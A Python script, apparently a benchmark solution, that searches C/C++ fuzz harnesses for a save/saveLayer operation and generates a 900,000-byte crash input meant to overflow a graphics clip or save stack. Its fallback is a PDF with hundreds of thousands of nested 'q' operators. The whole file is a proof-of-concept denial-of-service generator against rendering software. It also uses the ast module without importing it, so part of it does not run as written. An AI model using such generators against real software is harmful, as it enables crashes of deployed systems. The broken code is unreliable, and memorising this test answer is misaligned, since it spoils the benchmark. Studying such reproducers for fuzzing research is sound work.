import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


CODE_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".m", ".mm", ".inc", ".inl", ".ipp",
}


def _iter_source_files(src_path: str, max_size: int = 8 * 1024 * 1024) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > max_size:
                    continue
                ext = os.path.splitext(fn)[1].lower()
                if ext not in CODE_EXTS:
                    continue
                try:
                    with open(p, "rb") as f:
                        yield p, f.read()
                except OSError:
                    continue
        return

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > max_size:
                    continue
                name = m.name
                ext = os.path.splitext(name)[1].lower()
                if ext not in CODE_EXTS:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    yield name, data
                except Exception:
                    continue
    except Exception:
        return


def _decode(b: bytes) -> str:
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        return b.decode("latin-1", errors="ignore")


def _extract_constants(text: str) -> Dict[str, str]:
    consts: Dict[str, str] = {}

    # Strip block comments to reduce noise.
    text2 = re.sub(r"/\*.*?\*/", " ", text, flags=re.S)

    # constexpr/static const/const
    for m in re.finditer(
        r"\b(?:static\s+)?(?:constexpr\s+|const\s+)?(?:unsigned\s+|signed\s+)?(?:int|long\s+long|long|short|size_t|uint64_t|uint32_t|uint16_t|uint8_t|int64_t|int32_t|int16_t|int8_t)\s+([A-Za-z_]\w*)\s*=\s*([^;]+);",
        text2,
    ):
        name = m.group(1)
        expr = m.group(2).strip()
        if name not in consts:
            consts[name] = expr

    # enum { A = 1, B = 2 };
    for em in re.finditer(r"\benum\b[^{};]*\{([^}]*)\}", text2, flags=re.S):
        body = em.group(1)
        parts = body.split(",")
        for p in parts:
            pm = re.search(r"\b([A-Za-z_]\w*)\b\s*=\s*([^,}]+)", p)
            if pm:
                name = pm.group(1)
                expr = pm.group(2).strip()
                if name not in consts:
                    consts[name] = expr

    return consts


def _sanitize_cpp_expr(expr: str) -> str:
    e = expr.strip()
    e = re.sub(r"//.*", " ", e)
    e = re.sub(r"/\*.*?\*/", " ", e, flags=re.S)
    e = e.replace("\n", " ").replace("\r", " ").strip()

    # Remove common casts
    e = re.sub(r"\bstatic_cast\s*<[^>]+>\s*\(", "(", e)
    e = re.sub(r"\breinterpret_cast\s*<[^>]+>\s*\(", "(", e)
    e = re.sub(r"\bconst_cast\s*<[^>]+>\s*\(", "(", e)
    e = re.sub(r"\bdynamic_cast\s*<[^>]+>\s*\(", "(", e)

    # Remove C-style casts like (int) or (size_t)
    e = re.sub(r"\(\s*[A-Za-z_][A-Za-z0-9_:<>]*\s*\)\s*", "", e)

    # Remove integer suffixes
    e = re.sub(r"\b(\d+)\s*[uUlL]+\b", r"\1", e)

    # Replace hex suffixes with python-friendly (already)
    # Avoid sizeof expressions
    e = re.sub(r"\bsizeof\s*\([^)]*\)", "0", e)
    e = re.sub(r"\bsizeof\s+[A-Za-z_]\w*", "0", e)

    # Remove trailing commas
    e = e.strip().strip(",")

    return e


class _SafeEval(ast.NodeVisitor):
    __slots__ = ("names",)

    def __init__(self, names: Dict[str, int]):
        self.names = names

    def visit_Expression(self, node):
        return self.visit(node.body)

    def visit_Constant(self, node):
        if isinstance(node.value, (int, float)):
            return int(node.value)
        raise ValueError("bad const")

    def visit_Num(self, node):
        return int(node.n)

    def visit_Name(self, node):
        if node.id in self.names:
            return int(self.names[node.id])
        raise ValueError(f"unknown name {node.id}")

    def visit_UnaryOp(self, node):
        v = self.visit(node.operand)
        if isinstance(node.op, ast.UAdd):
            return +v
        if isinstance(node.op, ast.USub):
            return -v
        if isinstance(node.op, ast.Invert):
            return ~v
        raise ValueError("bad unary")

    def visit_BinOp(self, node):
        a = self.visit(node.left)
        b = self.visit(node.right)
        if isinstance(node.op, ast.Add):
            return a + b
        if isinstance(node.op, ast.Sub):
            return a - b
        if isinstance(node.op, ast.Mult):
            return a * b
        if isinstance(node.op, ast.FloorDiv):
            return a // b if b != 0 else 0
        if isinstance(node.op, ast.Div):
            return a // b if b != 0 else 0
        if isinstance(node.op, ast.Mod):
            return a % b if b != 0 else 0
        if isinstance(node.op, ast.LShift):
            return a << b
        if isinstance(node.op, ast.RShift):
            return a >> b
        if isinstance(node.op, ast.BitOr):
            return a | b
        if isinstance(node.op, ast.BitAnd):
            return a & b
        if isinstance(node.op, ast.BitXor):
            return a ^ b
        raise ValueError("bad binop")

    def visit_ParenExpr(self, node):
        return self.visit(node.value)

    def visit_Call(self, node):
        raise ValueError("no calls")

    def generic_visit(self, node):
        raise ValueError(f"bad node {type(node).__name__}")


def _eval_expr(expr: str, const_exprs: Dict[str, str], cache: Dict[str, int], depth: int = 0) -> int:
    if depth > 20:
        raise ValueError("too deep")
    e = _sanitize_cpp_expr(expr)
    if not e:
        raise ValueError("empty")
    if re.fullmatch(r"[+-]?\d+", e):
        return int(e)
    if re.fullmatch(r"0x[0-9a-fA-F]+", e):
        return int(e, 16)

    # Replace known names with evaluated ints if possible, recursively.
    names: Dict[str, int] = {}

    # Find identifiers
    for name in set(re.findall(r"\b[A-Za-z_]\w*\b", e)):
        if name in cache:
            names[name] = cache[name]
        elif name in const_exprs:
            try:
                names[name] = _eval_expr(const_exprs[name], const_exprs, cache, depth + 1)
                cache[name] = names[name]
            except Exception:
                pass

    tree = ast.parse(e, mode="eval")
    return int(_SafeEval(names).visit(tree))


def _type_size(type_name: str) -> int:
    t = type_name.strip()
    t = t.replace("std::", "")
    t = t.replace("unsigned ", "u").replace("signed ", "")
    t = t.replace(" ", "")
    if t in ("uint8_t", "u_char", "uchar", "unsignedchar", "char", "signedchar", "int8_t", "byte"):
        return 1
    if t in ("uint16_t", "ushort", "unsignedshort", "int16_t", "short"):
        return 2
    if t in ("uint32_t", "unsignedint", "int", "int32_t", "unsigned", "uint", "long") and t != "longlong":
        return 4
    if t in ("uint64_t", "int64_t", "size_t", "uintptr_t", "longlong", "unsignedlonglong"):
        return 8
    # Fallback (common for int)
    return 4


def _find_best_fuzzer(fuzzer_texts: List[Tuple[str, str]]) -> Optional[Tuple[str, str]]:
    best = None
    best_score = -1
    for name, text in fuzzer_texts:
        low = text.lower()
        score = 0
        if "fuzzeddataprovider" in low:
            score += 50
        if "consumeintegralinrange" in low:
            score += 20
        for kw, w in [
            ("clip", 10),
            ("clippath", 8),
            ("save", 10),
            ("savelayer", 12),
            ("restore", 6),
            ("stack", 8),
            ("layer", 6),
            ("canvas", 12),
            ("skia", 8),
            ("skcanvas", 12),
            ("skclip", 10),
            ("pdf", 3),
        ]:
            score += w * low.count(kw)
        if score > best_score:
            best_score = score
            best = (name, text)
    return best


def _parse_case_blocks(text: str) -> List[Tuple[int, int, int]]:
    cases = []
    for m in re.finditer(r"\bcase\s+(\d+)\s*:", text):
        try:
            c = int(m.group(1))
        except Exception:
            continue
        cases.append((c, m.start(), m.end()))
    cases.sort(key=lambda x: x[1])
    blocks = []
    for i, (c, s, e) in enumerate(cases):
        end = cases[i + 1][1] if i + 1 < len(cases) else len(text)
        blocks.append((c, e, end))
    return blocks


def _find_save_case_id(text: str) -> Optional[int]:
    blocks = _parse_case_blocks(text)
    if not blocks:
        return None

    best_id = None
    best_score = -1
    for cid, start, end in blocks:
        snippet = text[start:end]
        low = snippet.lower()

        # Must contain a save-like call and avoid restore
        if "restore" in low or ".restore" in low:
            continue

        score = 0
        if re.search(r"(\.|->)\s*save\s*\(", snippet):
            score += 100
        if re.search(r"\bsave\s*\(", snippet) and "savelayer" not in low:
            score += 30
        if "savelayer" in low:
            score += 60
        if "clip" in low:
            score += 10

        if score <= 0:
            continue

        if score > best_score or (score == best_score and (best_id is None or cid < best_id)):
            best_score = score
            best_id = cid

    return best_id


def _find_op_selector_consume_call(text: str, anchor_pos: int) -> Optional[Tuple[str, str, str]]:
    # Find nearest ConsumeIntegralInRange<T>(min,max) before anchor
    window_start = max(0, anchor_pos - 5000)
    window = text[window_start:anchor_pos]

    matches = list(re.finditer(r"ConsumeIntegralInRange\s*<\s*([A-Za-z0-9_:]+)\s*>\s*\(\s*([^,]+)\s*,\s*([^)]+)\)", window))
    if matches:
        m = matches[-1]
        type_name = m.group(1).strip()
        min_expr = m.group(2).strip()
        max_expr = m.group(3).strip()
        return type_name, min_expr, max_expr

    # Alternate: ConsumeIntegralInRange(min,max) without explicit template (rare)
    matches2 = list(re.finditer(r"ConsumeIntegralInRange\s*\(\s*([^,]+)\s*,\s*([^)]+)\)", window))
    if matches2:
        m = matches2[-1]
        return "uint8_t", m.group(1).strip(), m.group(2).strip()

    return None


def _gen_constant_byte_for_case(
    case_id: int,
    type_name: str,
    min_expr: str,
    max_expr: str,
    const_exprs: Dict[str, str],
) -> Optional[int]:
    try:
        cache: Dict[str, int] = {}
        mn = _eval_expr(min_expr, const_exprs, cache)
        mx = _eval_expr(max_expr, const_exprs, cache)
        if mx < mn:
            return None
        rng = mx - mn + 1
        if rng <= 0 or rng > 1_000_000:
            return None
        sz = _type_size(type_name)
        # Signed modulo issues: prefer b<128
        for b in range(0, 128):
            raw = int.from_bytes(bytes([b]) * sz, "little", signed=False)
            op = mn + (raw % rng)
            if op == case_id:
                return b
        for b in range(128, 256):
            raw = int.from_bytes(bytes([b]) * sz, "little", signed=False)
            op = mn + (raw % rng)
            if op == case_id:
                return b
        return None
    except Exception:
        return None


def _make_pdf_with_many_q(target_total_len: int = 900_000) -> bytes:
    # Content stream
    # q = save graphics state. Repeat to overflow nesting/clip stack.
    # Ensure overall file around target_total_len.
    header_overhead_est = 600
    n_q = max(1, (target_total_len - header_overhead_est) // 2)
    content = (b"q\n" * n_q) + b"Q\n"

    def obj(n: int, body: bytes) -> bytes:
        return (f"{n} 0 obj\n".encode("ascii") + body + b"\nendobj\n")

    parts: List[bytes] = []
    parts.append(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")

    # 1: catalog
    parts.append(obj(1, b"<< /Type /Catalog /Pages 2 0 R >>"))
    # 2: pages
    parts.append(obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"))
    # 3: page
    parts.append(obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R /Resources << >> >>"))
    # 4: contents stream
    stream_dict = f"<< /Length {len(content)} >>\nstream\n".encode("ascii")
    parts.append(f"4 0 obj\n".encode("ascii") + stream_dict + content + b"\nendstream\nendobj\n")

    # Build xref
    body = b"".join(parts)
    # xref requires offsets; object 0 is free
    # We included all objects in parts in order.
    offsets = [0]  # obj 0
    cursor = len(parts[0])
    # offsets for objs 1..4: compute by scanning concatenation precisely
    # Rebuild with offsets tracking
    all_parts = parts
    offsets = [0]
    cursor = len(all_parts[0])
    # For each object chunk in all_parts[1:]:
    for chunk in all_parts[1:]:
        offsets.append(cursor)
        cursor += len(chunk)
    xref_start = cursor
    xref_lines = [b"xref\n", b"0 5\n", b"0000000000 65535 f \n"]
    for off in offsets[1:]:
        xref_lines.append(f"{off:010d} 00000 n \n".encode("ascii"))
    xref = b"".join(xref_lines)
    trailer = b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n" + str(xref_start).encode("ascii") + b"\n%%EOF\n"
    pdf = body + xref + trailer
    return pdf


class Solution:
    def solve(self, src_path: str) -> bytes:
        fuzzers: List[Tuple[str, str]] = []
        global_low_hints = {
            "pdf": 0,
            "skia": 0,
            "canvas": 0,
            "clip": 0,
            "fuzzeddataprovider": 0,
        }

        # Collect fuzzer files and some hints
        for name, data in _iter_source_files(src_path):
            text = _decode(data)
            low = text.lower()

            if "llvmfuzzertestoneinput" in low:
                fuzzers.append((name, text))

            # global hints
            if "pdf" in low:
                global_low_hints["pdf"] += 1
            if "skia" in low or "skcanvas" in low or "skclip" in low:
                global_low_hints["skia"] += 1
            if "canvas" in low:
                global_low_hints["canvas"] += 1
            if "clip" in low:
                global_low_hints["clip"] += 1
            if "fuzzeddataprovider" in low:
                global_low_hints["fuzzeddataprovider"] += 1

        best = _find_best_fuzzer(fuzzers) if fuzzers else None

        # Try FuzzedDataProvider-based generation first
        if best is not None:
            _, ftext = best
            flow = ftext.lower()
            if "fuzzeddataprovider" in flow and "consumeintegralinrange" in flow and ("case" in flow):
                case_id = _find_save_case_id(ftext)
                if case_id is not None:
                    # Find an anchor near a "case <id>:" occurrence to locate the selector call
                    m_case = re.search(rf"\bcase\s+{case_id}\s*:", ftext)
                    anchor_pos = m_case.start() if m_case else len(ftext)
                    call = _find_op_selector_consume_call(ftext, anchor_pos)
                    const_exprs = _extract_constants(ftext)
                    if call is not None:
                        type_name, min_expr, max_expr = call
                        # Best is to find a constant byte producing the desired case regardless of alignment.
                        bval = _gen_constant_byte_for_case(case_id, type_name, min_expr, max_expr, const_exprs)
                        if bval is not None:
                            return bytes([bval]) * 900_000

                    # If save case is 0, constant zero is usually enough even without extracting range.
                    if case_id == 0:
                        return b"\x00" * 900_000

        # If not FDP-based, try PDF-based deep nesting
        if global_low_hints["pdf"] > 5 or (best is not None and "pdf" in best[1].lower()):
            return _make_pdf_with_many_q(900_000)

        # Conservative fallback: try constant zeros
        return b"\x00" * 900_000